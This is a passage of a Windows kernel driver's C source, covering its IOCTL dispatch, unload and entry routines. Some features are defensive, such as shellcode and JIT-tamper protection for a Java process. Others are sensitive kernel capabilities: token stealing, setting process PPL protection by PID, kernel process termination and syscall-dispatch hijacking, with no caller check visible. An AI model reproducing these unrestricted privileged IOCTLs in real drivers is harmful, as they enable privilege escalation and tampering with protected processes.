                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: 按 PID 设置 PPL ───
        case IOCTL_TZD_SET_PPL:
            if (inSize >= sizeof(TZD_SET_PPL_REQ) && buf)
            {
                status = tzd_set_ppl((PTZD_SET_PPL_REQ)buf);
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: 按 PID 查询 PPL ───
        case IOCTL_TZD_QUERY_PPL:
            if (inSize >= sizeof(TZD_QUERY_PPL_REQ) &&
                outSize >= sizeof(TZD_QUERY_PPL_RSP) && buf)
            {
                status = tzd_query_ppl((PTZD_QUERY_PPL_REQ)buf,
                                       (PTZD_QUERY_PPL_RSP)buf);
                info = sizeof(TZD_QUERY_PPL_RSP);
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: 内核终止进程 ───
        case IOCTL_TZD_KILL_PROCESS:
            if (inSize >= sizeof(TZD_KILL_REQ) && buf)
            {
                status = tzd_kill_process((PTZD_KILL_REQ)buf);
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: Token 窃取 ───
        case IOCTL_TZD_STEAL_TOKEN:
            if (inSize >= sizeof(TZD_STEAL_TOKEN_REQ) && buf)
            {
                status = tzd_steal_token((PTZD_STEAL_TOKEN_REQ)buf);
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: 设置 syscall 扫描目标 PID ───
        case IOCTL_TZD_SET_MONITOR_PID:
            if (inSize >= sizeof(TZD_SET_MONITOR_PID_REQ) && buf)
            {
                PTZD_SET_MONITOR_PID_REQ r = (PTZD_SET_MONITOR_PID_REQ)buf;
                g_MonitorPid = (HANDLE)(ULONG_PTR)r->Pid;
                DbgPrint("[tzd] monitor pid set = %lu\n", r->Pid);
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: 扫描直接 syscall + NX 阻断 ───
        case IOCTL_TZD_SCAN_SYSCALLS:
            if (outSize >= sizeof(TZD_SCAN_RESULT) && buf)
            {
                status = tzd_scan_syscalls((PTZD_SCAN_RESULT)buf);
                info = (status == STATUS_SUCCESS) ? sizeof(TZD_SCAN_RESULT) : 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: 事件驱动保护 (ObRegisterCallbacks, 推荐方案: 不崩/无TOCTOU/免疫indirect) ───
        case IOCTL_TZD_PROTECT_PID:
            if (inSize >= sizeof(TZD_PROTECT_PID_REQ) && buf)
            {
                status = tzd_arm_protect(((PTZD_PROTECT_PID_REQ)buf)->Pid);
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        case IOCTL_TZD_UNPROTECT_PID:
            tzd_disarm_protect();
            status = STATUS_SUCCESS;
            info = 0;
            break;

        // ─── 新: 反 Shellcode 防御 (针对指定 Java 进程: 允许 JIT / 阻断 shellcode) ───
        case IOCTL_TZD_ARM_SC_DEFENSE:
            if (inSize >= sizeof(TZD_SC_DEFENSE_REQ) && buf)
            {
                status = tzd_sc_arm(((PTZD_SC_DEFENSE_REQ)buf)->Pid);
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        case IOCTL_TZD_DISARM_SC_DEFENSE:
            tzd_sc_disarm();
            status = STATUS_SUCCESS;
            info = 0;
            break;

        case IOCTL_TZD_QUERY_SC_STATS:
            if (outSize >= sizeof(TZD_SC_RESULT) && buf)
            {
                PTZD_SC_RESULT r = (PTZD_SC_RESULT)buf;
                r->Scans = (ULONG)g_ScScans;
                r->PagesNx = (ULONG)g_ScPagesNx;
                r->ThreadsSeen = (ULONG)g_ScThreadsSeen;
                r->ImagesSeen = (ULONG)g_ScImagesSeen;
                r->UnsignedImgs = (ULONG)g_ScUnsignedImgs;
                r->FilelessPe = (ULONG)g_ScFilelessPe;
                r->Reserved[0] = (ULONG)g_EtwTiEnabled; // ETW-TI 主方案状态 (1=已强制启用)
                r->Reserved[1] = 0;
                status = STATUS_SUCCESS;
                info = sizeof(TZD_SC_RESULT);
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // ─── 新: ETW-TI 主方案 (PPL 式内核写: 强制 ThreatInt 发射; 失败回退周期扫描) ───
        case IOCTL_TZD_ARM_ETW_TI:
            status = tzd_etwti_resolve_and_enable();
            info = 0;
            break;

        case IOCTL_TZD_DISARM_ETW_TI:
            tzd_etwti_disable();
            status = STATUS_SUCCESS;
            info = 0;
            break;

        // 查询告警: 扫描发现 shellcode → Compromised=1 → RunPPL 在用户层 TerminateProcess(0x5C)
        case IOCTL_TZD_QUERY_ALERT:
            if (outSize >= sizeof(TZD_SC_ALERT) && buf)
            {
                PTZD_SC_ALERT a = (PTZD_SC_ALERT)buf;
                a->Compromised = (ULONG)g_ScCompromised;
                a->ChildBlocked = (ULONG)g_ScChildBlocked;
                a->LastShellcodeType = (ULONG)g_ScLastShellcodeType;
                a->CreatorThreadId = (ULONG)g_ScLastCreatorTid;
                a->LastShellcodeVa = (ULONG64)g_ScLastShellcodeVa;
                status = STATUS_SUCCESS;
                info = sizeof(TZD_SC_ALERT);
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // 系统调用追踪劫持 (KiTrackSystemCallEntry; PG-safe 数据写)
        case IOCTL_TZD_ARM_SYSTRACE:
            status = tzd_systrace_arm();
            info = 0;
            break;

        case IOCTL_TZD_DISARM_SYSTRACE:
            tzd_systrace_disarm();
            status = STATUS_SUCCESS;
            info = 0;
            break;

        // ─── Thin Hypervisor (VMX + EPT) ───
        case IOCTL_TZD_ARM_HYPERVISOR:
            status = hypervisor_arm();
            info = 0;
            break;

        case IOCTL_TZD_DISARM_HYPERVISOR:
            hypervisor_disarm();
            status = STATUS_SUCCESS;
            info = 0;
            break;

        // ─── JIT 代码缓存写保护 (EPT-based: 区分 JIT 合法写 vs 恶意篡改) ───
        //   JDK20 代码缓存永久 RWX (os_windows.cpp:3476), JVM 用直接指针写
        //   (nativeInst_x86.hpp:86 set_int_at) 修改; 写者 RIP 必在 jvm.dll 内
        //   restricted EPT 将 JIT 2MB 物理页设 R-X → 写触发 EPT violation
        //   → handler 检查写者 RIP → 允许(JVM) / 阻止(非 JVM)
        case IOCTL_TZD_REGISTER_JIT_RANGE:
            if (inSize >= sizeof(TZD_JIT_RANGE_REQ) && buf)
            {
                PTZD_JIT_RANGE_REQ r = (PTZD_JIT_RANGE_REQ)buf;
                // 1. 存 GVA 范围 (EPT violation handler 用 GUEST_LINEAR_ADDRESS 匹配)
                hypervisor_register_jit_range(r->Base, r->Size);
                // 2. 附着进程走页表, 限制对应物理 2MB 页为 R-X
                status = tzd_restrict_jit_for_pid(r->Pid, r->Base, r->Size);
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        case IOCTL_TZD_SET_JVM_WRITER:
            if (inSize >= sizeof(TZD_JVM_WRITER_REQ) && buf)
            {
                PTZD_JVM_WRITER_REQ r = (PTZD_JVM_WRITER_REQ)buf;
                hypervisor_set_jvm_writer_range(r->JvmBase, r->JvmSize);
                status = STATUS_SUCCESS;
                info = 0;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        // 查询 JIT 篡改告警: 发现非 JVM 写 JIT → JitTampered=1 → 用户层 kill 0x5C
        case IOCTL_TZD_QUERY_JIT_ALERT:
            if (outSize >= sizeof(TZD_JIT_ALERT) && buf)
            {
                PTZD_JIT_ALERT a = (PTZD_JIT_ALERT)buf;
                hypervisor_query_jit_alert(&a->JitTampered, &a->JitBlocks,
                                           &a->JitAllows, &a->JitRangeCount,
                                           &a->TamperRip, &a->TamperVa);
                status = STATUS_SUCCESS;
                info = sizeof(TZD_JIT_ALERT);
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;

        case IOCTL_TZD_CLEAR_JIT_RANGES:
            hypervisor_clear_jit_ranges();
            status = STATUS_SUCCESS;
            info = 0;
            break;

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
        }
    }
    else if (io->MajorFunction == IRP_MJ_CREATE || io->MajorFunction == IRP_MJ_CLOSE)
    {
        // 允许打开/关闭
    }
    else
    {
        status = STATUS_INVALID_DEVICE_REQUEST;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 卸载例程 (BSOD 已修复) ──────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

static void tzd_unload(PDRIVER_OBJECT DriverObj)
{
    UNREFERENCED_PARAMETER(DriverObj);

    // 1. 设卸载标志 — dispatch 例程拒绝新 IRP
    InterlockedExchange(&g_Unloading, 1);

    // 2. 先注销 ObRegisterCallbacks (必须在删设备前, 否则回调仍可能触发)
    tzd_disarm_protect();

    // 2b. 关闭反 Shellcode 防御: 停扫描线程 + 注销线程/镜像通知 (必须在删设备前)
    tzd_sc_shutdown();

    // 2c. 关闭 ETW-TI 主方案 (置 count=0, 停发射) — 必须在删设备前
    tzd_etwti_disable();

    // 2d. 关闭系统调用追踪劫持 (恢复 dispatcher, 去激活, 清 gate) — 必须在删设备前
    tzd_systrace_disarm();

    // 2e. 清除 JIT 代码缓存写保护状态 (JIT 范围/篡改标志/restricted EPT 恢复) — 必须在删设备前
    hypervisor_clear_jit_ranges();

    // 2f. 若 hypervisor 仍 armed → disarm (释放 VMX 资源; 否则 VM exit 跳已释放代码→BSOD)
    if (g_vmx_enabled)
    {
        DbgPrint("[tzd] unload: hypervisor still armed → disarming\n");
        hypervisor_disarm();
    }

    // 3. 短暂延时 — 让在途 IRP 完成 (100ms, 100ns 单位, 负数=相对时间)
    LARGE_INTEGER wait;
    wait.QuadPart = -1000000LL;
    KeDelayExecutionThread(KernelMode, FALSE, &wait);

    // 4. 先删符号链接 — 新的 CreateFile 不再能到达设备
    IoDeleteSymbolicLink(&g_SymLink);

    // 5. 再删设备 — 若有未关闭句柄, IO 管理器延后删除直到最后一个句柄关闭
    if (g_DeviceObj)
    {
        IoDeleteDevice(g_DeviceObj);
        g_DeviceObj = NULL;
    }

    // *** 不调用 RtlFreeUnicodeString(&g_SymLink) ***
    // g_SymLink.Buffer 指向静态字面量 SYMLINK_NAME (RtlInitUnicodeString 不分配 pool)
    // 调用 RtlFreeUnicodeString 会对非堆指针执行 ExFreePool → BSOD
    // (这是旧版 BSOD 的根因, 已修复)
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 驱动入口 ──────────────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObj, PUNICODE_STRING RegPath)
{
    UNREFERENCED_PARAMETER(RegPath);

    // 0. 动态解析 EPROCESS.Protection 偏移 (从 PsGetProcessProtection 机器码)
    tzd_init_offsets();

    // 版本标记: 便于 DbgView 确认加载的是新驱动 (旧驱动无此行)
    DbgPrint("[tzd] tzd_ppl_drv LOADED build=2026-08-13-jit-protect (EPT-based JIT write protection: restricted EPT R-X on JIT 2MB pages; GUEST_LINEAR_ADDRESS + writer RIP check distinguishes legitimate JVM set_int_at/Atomic::store patches from malicious shellcode/Unsafe.putByte tampering; JDK20 code cache RWX os_windows.cpp:3476 + direct pointer writes nativeInst_x86.hpp:86 confirmed)\n");

    // 0b. 初始化反 Shellcode 扫描线程的 stop event (NotificationEvent: 信号后扫描线程退出)
    KeInitializeEvent(&g_ScStopEvent, NotificationEvent, FALSE);

    UNICODE_STRING devName;
    RtlInitUnicodeString(&devName, DEVICE_NAME);

    NTSTATUS st = IoCreateDevice(DriverObj, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &g_DeviceObj);
    if (!NT_SUCCESS(st))
    {
        DbgPrint("[tzd] IoCreateDevice failed, status = 0x%08X\n", st);
        return st;
    }

    // RtlInitUnicodeString 不分配内存 — Buffer 指向静态字面量
    // 卸载时不能 RtlFreeUnicodeString (见 tzd_unload 注释)
    RtlInitUnicodeString(&g_SymLink, SYMLINK_NAME);
    st = IoCreateSymbolicLink(&g_SymLink, &devName);
    if (!NT_SUCCESS(st))
    {
        DbgPrint("[tzd] IoCreateSymbolicLink failed, status = 0x%08X\n", st);
        IoDeleteDevice(g_DeviceObj);
        g_DeviceObj = NULL;
        return st;
    }

    DriverObj->MajorFunction[IRP_MJ_CREATE] = tzd_dispatch;
    DriverObj->MajorFunction[IRP_MJ_CLOSE] = tzd_dispatch;
    DriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = tzd_dispatch;
    DriverObj->DriverUnload = tzd_unload;

    g_DeviceObj->Flags |= DO_BUFFERED_IO;
    g_DeviceObj->Flags &= ~DO_DEVICE_INITIALIZING;

    return STATUS_SUCCESS;
}
